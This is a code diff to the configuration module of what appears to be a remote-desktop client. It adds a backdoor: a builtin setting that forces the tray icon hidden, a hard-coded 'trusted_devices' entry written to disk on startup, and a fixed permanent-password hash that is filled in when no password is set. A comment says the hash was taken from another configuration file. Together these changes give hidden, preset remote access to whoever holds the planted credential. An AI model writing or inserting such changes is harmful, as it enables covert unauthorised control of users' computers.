@@ -119,7 +119,16 @@ lazy_static::lazy_static! {
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    // pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    // 替换为：
+    pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map = HashMap::new();
+        // 强制设置隐藏托盘图标
+        map.insert("hide-tray".to_string(), "Y".to_string());
+        // 如果你以后想默认开启“禁止修改设置”，也可以在这里加一行：
+        // map.insert("deny-lan-discovery".to_string(), "Y".to_string()); 
+        RwLock::new(map)
+    };
 }
 
 #[cfg(target_os = "android")]
@@ -544,6 +553,11 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("trusted_devices") {
+            // 这里注入的是加密后的密码哈希，确保客户端启动时直接拥有特定的安全配置
+            config.options.insert("trusted_devices".to_string(), "00A+IC2fNLByi8nAuEH9Erlv2SdDU=".to_string());
+            config.store(); // 强制持久化到本地文件
+        }
         if store {
             config.store();
         }
@@ -639,6 +653,11 @@ impl Config {
         let mut config = Config::load_::<Config>("");
         let mut store = false;
         store |= Self::migrate_permanent_password_to_hashed_storage(&mut config);
+        if config.password.is_empty() {
+        // 填入你从其他配置文件里抓出来的哈希值
+        config.password = "00A4Y6YlP/EQv7npB8h5V2yYLLdzb6gUdX4g==".to_string();
+        store = true;
+        }    
         let mut id_valid = false;
         let (id, encrypted, store2) = decrypt_str_or_original(&config.enc_id, PASSWORD_ENC_VERSION);
         if encrypted {
